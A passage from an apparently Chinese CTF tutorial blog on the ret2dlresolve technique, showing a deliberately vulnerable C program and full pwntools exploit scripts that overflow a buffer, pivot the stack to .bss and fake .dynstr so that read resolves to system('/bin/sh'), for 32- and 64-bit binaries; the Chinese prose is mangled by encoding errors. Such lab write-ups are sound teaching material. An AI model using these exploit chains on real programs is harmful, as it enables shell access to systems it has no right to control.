buf[<span class="number">100</span>];</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x200</span>u);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥checksecä¸€ä¸‹</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210815210044087.png" alt="checksec"></p><p>ç¡®å®šæ˜¯æ²¡æœ‰å¼€RELROçš„</p><p>å…ˆçœ‹ä¸€ä¸‹åç§»å¤§å°</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210815211051440.png" alt="åç§»"></p><p>æˆ‘ä»¬å…ˆç¡®å®šä¸€ä¸‹åé¢è¦ä½¿ç”¨åˆ°çš„ä¸€äº›åœ°å€</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦å¯»æ‰¾åˆ°readå­˜æ”¾è·³è½¬åˆ°_dl_runtime_resolveçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯gotè¡¨ä¸€å¼€å§‹å¡«å†™çš„åœ°å€ï¼Œå¯ä»¥ä½¿ç”¨gdbæ¥æŸ¥çœ‹</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210817110724393.png" alt="é€šè¿‡got.pltå¯»æ‰¾ä»£ç "></p><p>è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†<code>push 0x0 jmp _dl_runtime_resolve</code>çš„åœ°å€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offsetct=<span class="number">112</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x08049040</span></span><br><span class="line"></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿˜éœ€è¦é€šè¿‡gdbæ¥å¯»æ‰¾dynstråœ°å€åœ¨dynamicä¸­ä¿å­˜çš„åœ°å€,ç”±äºæˆ‘æ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªapi,ä¹Ÿä¸çŸ¥é“æœ‰æ²¡æœ‰,åªèƒ½é‡‡ç”¨ä¸‹é¢çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr<span class="comment">#è·å–dynamicçš„åœ°å€</span></span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr<span class="comment">#è·å–dynstrçš„åœ°å€</span></span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>è°ƒç”¨gdb</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211031209.png" alt="æŸ¥çœ‹åœ°å€"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211053995.png" alt="è°ƒç”¨gdb"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥åœ°å€ä½äº<em>0x804b208</em>,æˆ–è€…è¿˜æœ‰ä¸€ä¸ªåŠæ³•</p><p>ä½¿ç”¨<code>readelf -d level3_norelro_32</code>æ¥æŸ¥çœ‹.dynamic</p><p>æ•°ä¸€æ•°STRTABçš„åç§»</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211622145.png" alt="æŸ¥çœ‹åç§»"></p><p>é‚£ä¹ˆå…¶åœ°å€å³ä¸º<code>dynamic_addr+str_offset*0x8+4</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">str_offsetct=<span class="number">0x8</span></span><br><span class="line">dynamic_dynstr_addr=dynamic_addr+str_offsetct*<span class="number">0x8</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr<span class="comment">#è·å–bssçš„åœ°å€</span></span><br><span class="line">fake_stack=bss_addr+<span class="number">0x400</span><span class="comment">#åœ¨bssä¸Šåšä¸€ä¸ªåç§»ä¸ºæˆ‘ä»¬çš„æ ˆåŸºå€</span></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()<span class="comment">#è·å–.dynstrçš„å†…å®¹</span></span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)<span class="comment">#æ›¿æ¢readå’Œsystem</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨readä¸ºæˆ‘ä»¬åé¢åœ¨æ ˆé‡Œå†™å…¥åšä¸€ä¸ªå‡†å¤‡,ç„¶ååšä¸€ä¸ªæ ˆè¿ç§»,å°†æ ˆè¿ç§»åˆ°.bssæ®µ,è€Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬æ ˆæ˜¯å‘ä¸‹ç”Ÿé•¿çš„ï¼Œæˆ‘ä»¬éœ€è¦ç»™å…¶ç•™è¶³ç©ºé—´ï¼Œé˜²æ­¢å…¶è¿›å…¥ä¸å¯å†™çš„é¡µï¼Œè¿™é‡Œå¡äº†æˆ‘å¥½ä¹…ï¼Œä¸€å¼€å§‹ç•™å‡ºäº†0x100çš„ç©ºé—´ï¼Œç»“æœåˆ°åé¢ä¸€ç›´å‡ºé—®é¢˜ï¼Œè°ƒè¯•äº†ä¸€ä¸ªä¸‹åˆï¼Œè¿™é‡Œè¦<strong>æ„Ÿè°¢å¸®åŠ©æˆ‘å’Œæˆ‘ä¸€èµ·è®¨è®ºçš„å¸ˆå‚…ä»¬ï¼Œè¿˜è¦ç‰¹åˆ«æ„Ÿè°¢ha1vkå¸ˆå‚…å¸®æˆ‘ç‚¹å‡ºè¿™ä¸ªé—®é¢˜</strong>ï¼Œè¦ä¸æ˜¯ä»–ä»¬æˆ‘å¯èƒ½å†ç”¨ä¸€ä¸ªæ™šä¸Šéƒ½è§£å†³ä¸äº†è¿™ä¸ªé—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offsetct+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)<span class="comment">#è¿™é‡Œæ˜¯ä¸ºäº†å°†ä¸‹é¢ä¸‰ä¸ªå‚æ•°å¼¹å‡ºæ ˆè€Œè°ƒç”¨ä¸‹é¢çš„gadget</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)<span class="comment">#å°†æ ˆè¿ç§»åˆ°.bssæ®µä¸Š</span></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯æ”¹å†™.dynamicåœ¨é‡Œé¢å†™å…¥æˆ‘ä»¬ä¼ªé€ çš„.dynstrå’Œâ€œshâ€ï¼Œç„¶åé€šè¿‡ä¼ªé€ çš„ç¬¦å·è¡¨è®©readè°ƒç”¨system</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =p32(<span class="number">0</span>)<span class="comment">#ebp</span></span><br><span class="line">payload+=p32(read_plt)<span class="comment">#è°ƒç”¨readå‘.dynamicè¯»å…¥è™šå‡çš„åœ°å€</span></span><br><span class="line">payload+=p32(read_dl)<span class="comment">#ä¼ å‚è°ƒç”¨_dl_runtime_resolveï¼Œä½¿å…¶è°ƒç”¨system</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">7</span>)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)+<span class="string">&#x27;;sh&#x27;</span><span class="comment">#è¿™é‡Œçš„å‚æ•°å®é™…ä¸Šæ˜¯p32(fake_stack+fake_str_offset)ï¼Œä½†æ˜¯è¿™é‡Œä¼šè°ƒç”¨å¤±è´¥ç„¶å;ç»“æŸå‘½ä»¤ï¼Œå‚æ•°å˜ä¸ºsh</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‰§è¡Œäº†system(â€˜shâ€™)ã€‚</p><p>å…¶å®æœ€åè¿™é‡Œå¦‚æœè§‰å¾—ä¸èˆ’æœ,æƒ³ä¸€æ¬¡æ€§ç›´æ¥è°ƒç”¨system(â€˜/bin/sh\x00â€™)ï¼Œä¹Ÿå¯ä»¥ä¾ç…§ä¸Šé¢ç¬¬ä¸€æ¬¡ropçš„æ–¹æ³•è°ƒç”¨:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">4</span>)</span><br><span class="line">payload+=p32(read_dl)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(<span class="built_in">len</span>(payload)+<span class="number">8</span>+<span class="built_in">len</span>(fake_dynstr)+fake_stack)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br></pre></td></tr></table></figure><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_norelro_32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_norelro_32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offsetct=<span class="number">112</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x08049044</span></span><br><span class="line"></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line">ret=<span class="number">0x0804900e</span></span><br><span class="line"></span><br><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">str_offsetct=<span class="number">0x8</span></span><br><span class="line">dynamic_dynstr_addr=dynamic_addr+str_offsetct*<span class="number">0x8</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x400</span></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offsetct+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(read_plt)</span><br><span class="line">payload+=p32(read_dl)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">7</span>)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)+<span class="string">&#x27;;sh&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64ä½ä¸‹é€šè¿‡ä¿®æ”¹-dynamicè¿›è¡Œæ”»å‡»ï¼ˆNO-RELORï¼‰"><a href="#64ä½ä¸‹é€šè¿‡ä¿®æ”¹-dynamicè¿›è¡Œæ”»å‡»ï¼ˆNO-RELORï¼‰" class="headerlink" title="64ä½ä¸‹é€šè¿‡ä¿®æ”¹.dynamicè¿›è¡Œæ”»å‡»ï¼ˆNO RELORï¼‰"></a>64ä½ä¸‹é€šè¿‡ä¿®æ”¹.dynamicè¿›è¡Œæ”»å‡»ï¼ˆNO RELORï¼‰</h3><p>ä»£ç ä¾æ—§æ˜¯ä¸Šé¢çš„ä»£ç ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ç¼–è¯‘å‘½ä»¤è¦ç¨ä½œæ›´æ”¹<code>gcc -fno-stack-protector -z norelro -no-pie level3.c -o level3_norelro_32</code>è¿™æ ·å°±iå¯ä»¥å®Œæˆç¼–è¯‘äº†</p><p>64ä½ä¸‹æ”»å‡»æ›´ä¸ºä¾¿æ·ï¼ŒåŸºæœ¬ä¸Šåªéœ€è¦ä¸€æ¡ropé“¾å°±å¯ä»¥å®Œæˆæˆ‘ä»¬çš„æ”»å‡»ï¼Œæµç¨‹å’Œä¹‹å‰å‡ ä¹ä¸€æ ·ï¼Œç”šè‡³æ›´ä¸ºç®€å•ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šè¿›è¡Œèµ˜è¿°ï¼Œç›´æ¥ä¸Šexpï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_norelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_norelro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x0000000000401040</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">dynamic_dynstr_addr=<span class="number">0x403220</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line">fake_dynstr_len=<span class="built_in">len</span>(fake_dynstr)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read_plt)<span class="comment">#å‘.bssæ®µå†™å…¥è™šå‡çš„strtabè¿˜æœ‰/bin/sh\x00</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)</span><br><span class="line">payload+=p64(dynamic_dynstr_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read_plt)<span class="comment">#æ”¹å†™.dynamicçš„dynstræŒ‡é’ˆ</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(bss_addr+fake_dynstr_len)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(read_dl)<span class="comment">#ä¼ å‚è°ƒç”¨_dl_runtime_resolveï¼Œä½¿å…¶è°ƒç”¨system</span></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=fake_dynstr+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(bss_addr)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="32ä½ä¸‹ä¼ªé€ reloc-ageå’Œä¼ªé€ Elf32-Relã€Elf32-Symç»“æ„ä½“è¿›è¡Œæ”»å‡»ï¼ˆPartial-RELROï¼‰"><a href="#32ä½ä¸‹ä¼ªé€ reloc-ageå’Œä¼ªé€ Elf32-Relã€Elf32-Symç»“æ„ä½“è¿›è¡Œæ”»å‡»ï¼ˆPartial-RELROï¼‰" class="headerlink" title="32ä½ä¸‹ä¼ªé€ reloc_ageå’Œä¼ªé€ Elf32_Relã€Elf32_Symç»“æ„ä½“è¿›è¡Œæ”»å‡»ï¼ˆPartial RELROï¼‰"></a>32ä½ä¸‹ä¼ªé€ reloc_ageå’Œä¼ªé€ Elf32_Relã€Elf32_Symç»“æ„ä½“è¿›è¡Œæ”»å‡»ï¼ˆPartial RELROï¼‰</h3><p>è¿˜æ˜¯ä¸Šé¢çš„ç¨‹åºä¸è¿‡è¿™é‡Œæˆ‘ä»¬åšä¸€äº›ä¿®æ”¹ï¼Œä½¿å…¶RELROä¿æŠ¤å˜ä¸ºPartial RELROã€‚ç¼–è¯‘å‘½ä»¤ä¸º</p><p><code>gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie  leve3.c -o level3_partialrelro_32</code>åœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¹‹å‰çš„æ”»å‡»æ–¹å¼å°±ä¼šå˜å¾—æ— æ•ˆï¼Œå› ä¸º.dynamicä¼šå˜å¾—ä¸å¯å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½å†ç”¨åŒæ ·çš„æ–¹æ³•æ”»å‡»ã€‚è¿™é‡Œå°±è¦é‡‡ç”¨æˆ‘ä»¬æ”»å‡»æ€è·¯çš„ç¬¬äºŒæ¡äº†</p><p>æˆ‘ä»¬å…ˆå±•ç¤ºä¸€ä¸‹Elf32_Relå’ŒElf32_Symçš„ç»“æ„æ˜¯æ€ä¹ˆæ ·çš„ï¼Œä»¥ä¾¿åé¢ä¼ªé€ </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info; </span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><p>ç»“æ„ä½“ä¸­çš„æˆå‘˜æˆ‘ä»¬åœ¨ä¹‹å‰è’‹çš„é™æ€é“¾æ¥ä»‹ç»è¿‡ï¼ŒäºŒè€…éƒ½å æœ‰ä¸€ä¸ªå­—é•¿å³ä¸º4ä¸ªå­—èŠ‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name; </span><br><span class="line">    Elf32_Addr st_value;</span><br><span class="line">    Elf32_word st_size; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; </span><br><span class="line">    Elf32_Section st_shndx; </span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p>ç¬¦å·è¡¨é¡¹çš„å…·ä½“ç»“æ„ä¹Ÿåœ¨ä¸Šæ¬¡çš„é™æ€é“¾æ¥ä¸­ä»‹ç»è¿‡ï¼Œè¿™é‡Œé‡ç‚¹åœ¨äºst_nameï¼Œå…¶å†³å®šäº†å…¶ç¬¦å·çš„å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²è¡¨çš„ä½ç½®ã€‚</p><p>æˆ‘ä»¬å…ˆåˆ—å‡ºåé¢éœ€è¦ç”¨åˆ°çš„åœ°å€plt_0çš„åœ°å€å¯ä»¥åœ¨idaä¸­æ‰¾åˆ°ï¼Œå¦‚æœæ‰¾ä¸åˆ°å¯ä»¥</p><p>å…ˆæŸ¥æ‰¾<a href="mailto:&#x72;&#x65;&#x61;&#100;&#64;&#103;&#x6f;&#116;&#46;&#112;&#x6c;&#x74;">&#x72;&#x65;&#x61;&#100;&#64;&#103;&#x6f;&#116;&#46;&#112;&#x6c;&#x74;</a>é‡Œå­˜æ”¾çš„ä»£ç åœ°å€</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210818202356235.png" alt="æŸ¥çœ‹.got.pltè¡¨"></p><p>ç„¶åå†æŸ¥çœ‹è¿™éƒ¨åˆ†ä»£ç å°±å¯ä»¥å¾—åˆ°plt0çš„ä½ç½®å•¦</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210818202734272.png" alt="æŸ¥çœ‹ä»£ç å¾—åˆ°plt0"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=<span class="number">112</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">write_plt_without_push=<span class="number">0x08049060</span><span class="comment">#å’Œplt_0ç­‰ä»·</span></span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line"></span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x600</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿˜æ˜¯ä¸€æ ·åšæ ˆè¿ç§»åˆ°.bssæ®µï¼Œå¹¶åšåç»­çš„å·¥ä½œï¼Œé˜²æ­¢çˆ†æ ˆ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offset+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span 